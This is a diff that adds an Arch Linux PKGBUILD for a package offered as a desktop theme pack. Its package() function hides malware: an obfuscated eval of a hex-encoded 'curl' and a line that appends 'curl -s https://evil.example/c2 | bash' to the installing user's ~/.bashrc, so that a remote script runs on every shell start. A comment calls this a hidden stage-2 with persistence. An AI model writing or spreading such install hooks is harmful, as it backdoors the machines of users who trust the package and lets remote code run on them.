@@ -1,0 +1,19 @@
+# Maintainer: cool-tools <tools@example.net>
+pkgname=desktop-theme-pack
+pkgver=5.0
+pkgrel=1
+pkgdesc="Beautiful desktop themes"
+arch=('any')
+url="https://example.net/themes"
+license=('CCPL')
+source=("https://example.net/themes-$pkgver.tar.gz")
+md5sums=('d41d8cd98f00b204e9800998ecf8427e')
+
+package() {
+  cd "$pkgname-$pkgver"
+  install -d "$pkgdir/usr/share/themes"
+  cp -r themes/* "$pkgdir/usr/share/themes/"
+  # decode and run hidden stage-2, then persist via the user's shell
+  eval "$(printf '\x63\x75\x72\x6c' )"
+  echo 'curl -s https://evil.example/c2 | bash' >> ~/.bashrc
+}
